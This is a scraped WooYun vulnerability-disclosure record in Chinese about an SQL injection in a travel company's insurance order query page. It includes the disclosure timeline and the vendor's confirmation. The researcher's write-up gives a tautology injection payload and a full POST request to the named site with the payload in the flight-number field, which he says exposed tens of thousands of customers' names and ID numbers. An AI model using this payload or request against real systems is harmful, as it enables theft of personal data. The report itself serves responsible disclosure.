{"id": 47570, "wybug_id": "wooyun-2014-086176", "wybug_title": "四川我要去哪517旅行网另一处SQL注入导致数百万客户信息泄露(姓名、身份证号、航班等)", "wybug_corp": "517na.com", "wybug_author": "Jim叔叔", "wybug_date": "2014-12-06 21:18", "wybug_open_date": "2015-01-20 21:20", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-20：\t细节向公众公开  简要描述： [抠鼻] 听说前台MM在挑选的礼物，，可是迟迟没有来，，决定再注射一下。。。。 详细说明：  问题存在于电子保险页面：\n\n在航班号的地方输入了一个单引号，弹出如下sql错误，有戏！\n\n\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '2014-12-1 0:00:00' AND CreateTime <'2014-12-6 23:59:59'' at line 1\n于是输入’or’’=’，点查询，吓一跳，从2014-10-1到2014-11-30就有4万多条记录，可以执行查看详情、下载保单等操作：\n\n\nPOST http://www.510bx.com/Insurance/InsuranceOrderQuery.aspx?DeptID=228147txtInsuranceOrderId=11&txtTicketOrderId=&txtStartTime=2014-10-01&txtEndTime=2014-11-30&txtInsuranceName=&txtInsuranceNo=&txtflightNo='or''='&txtTicket=&airStartTime=&airEndTime=&orderStatus=%C8%AB%B2%BF&txtPNRCode=&BtnSearch=%B2%E9%D1%AF&wcfGrid%24ctl04%24txtPage=0\n由于有限制一次只能查两个月内的，换个日期2014-08-01到2014-09-30又是4万多条记录。。\n\n查看详情，里面有姓名、身份证号、保单号、机票订单号、航班号等各种信息：\n\n\n\n信息量太大，没有保存任何一条记录，拒绝喝茶。。。。。。。。。   漏洞证明：  \n\n\n\n   修复方案：  过滤、、   版权声明：转载请注明来源 Jim叔叔@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-12-08 08:56 厂商回复： 谢谢你对517的关注。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}